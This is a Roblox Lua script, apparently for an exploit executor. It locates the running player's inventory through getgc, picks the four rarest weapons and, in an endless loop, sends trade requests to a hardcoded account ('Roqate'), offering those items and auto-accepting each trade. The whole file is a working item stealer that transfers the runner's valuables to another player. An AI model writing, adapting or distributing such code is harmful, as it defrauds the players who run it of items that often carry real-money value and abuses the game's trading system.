local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 2
local ITEM_ADD_DELAY = 0.5
local ACCEPT_DELAY = 1 -- Wait 1 second before accepting

-- Rarity priority
local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}
for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

-- === Inventory Functions ===
local function getCorrectMyInventory()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            local inv = module.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

local function getTop4Weapons()
    local inv = getCorrectMyInventory()
    if not inv then
        warn("❌ Inventory not found!")
        return {}
    end

    local candidates = {}
    for _, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(candidates, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    table.sort(candidates, function(a,b) return a.priority < b.priority end)

    local picked = {}
    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
        table.insert(picked, candidates[i].name)
    end
    return picked
end

-- === Trade Functions ===
local function doTradeCycle(targetPlayer)
    print("\n🔄 Starting trade with", targetPlayer.Name)
    
    -- 1. Send trade request
    local success, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)
    if not success then
        warn("❌ Trade request failed:", err)
        return
    end
    print("✅ Request sent")
    
    -- Wait briefly for UI to appear
    task.wait(1)
    
    -- 2. Add all items without verification
    local weapons = getTop4Weapons()
    if #weapons > 0 then
        print("➕ Adding items:", table.concat(weapons, ", "))
        for _, weapon in ipairs(weapons) do
            pcall(function()
                TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
            end)
            task.wait(ITEM_ADD_DELAY)
        end
    else
        warn("⚠ No items to add!")
        return
    end
    
    -- 3. Accept after delay
    task.wait(ACCEPT_DELAY)
    print("✅ Accepting trade")
    pcall(function()
        TradeRemotes.AcceptTrade:FireServer()
    end)
    
    -- 4. Wait for trade to complete
    print("⏳ Waiting for trade to complete...")
    task.wait(3)
    print("✅ Cycle complete\n")
end

-- === Main Loop ===
while true do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        doTradeCycle(target)
    else
        print("Waiting for", TARGET_PLAYER, "...")
    end
    task.wait(TRADE_COOLDOWN)
end
